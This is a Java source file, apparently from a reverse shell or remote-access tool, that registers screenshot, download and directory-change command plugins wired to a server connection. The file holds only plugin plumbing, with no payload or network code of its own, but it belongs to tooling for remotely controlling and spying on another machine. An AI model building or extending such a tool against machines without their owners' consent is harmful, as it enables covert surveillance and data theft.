package obs1d1anc1ph3r.reverseshell;

import obs1d1anc1ph3r.reverseshell.plugins.CommandPlugin;
import obs1d1anc1ph3r.reverseshell.plugins.DownloadCommand;
import obs1d1anc1ph3r.reverseshell.plugins.ScreenshotCommand;
import java.util.HashMap;
import java.util.Map;
import obs1d1anc1ph3r.reverseshell.plugins.CDCommand;

public class PluginManager {

    private final Map<String, CommandPlugin> plugins = new HashMap<>();

    public PluginManager(ServerConnection serverConnection) {
        loadPlugins(serverConnection);
    }

    private void loadPlugins(ServerConnection serverConnection) {
        // Instantiate plugins and inject dependencies
        ScreenshotCommand screenshotCommand = new ScreenshotCommand();
        screenshotCommand.setServerConnection(serverConnection);
        plugins.put(screenshotCommand.getCommandName().toLowerCase(), screenshotCommand);

        DownloadCommand downloadCommand = new DownloadCommand();
        downloadCommand.setServerConnection(serverConnection);
        plugins.put(downloadCommand.getCommandName().toLowerCase(), downloadCommand);

        CDCommand cdCommand = new CDCommand();
        plugins.put(cdCommand.getCommandName().toLowerCase(), cdCommand);
    }

    public CommandPlugin getPlugin(String commandName) {
        return plugins.get(commandName.toLowerCase());
    }

    public Map<String, CommandPlugin> getPlugins() {
        return plugins;
    }
}
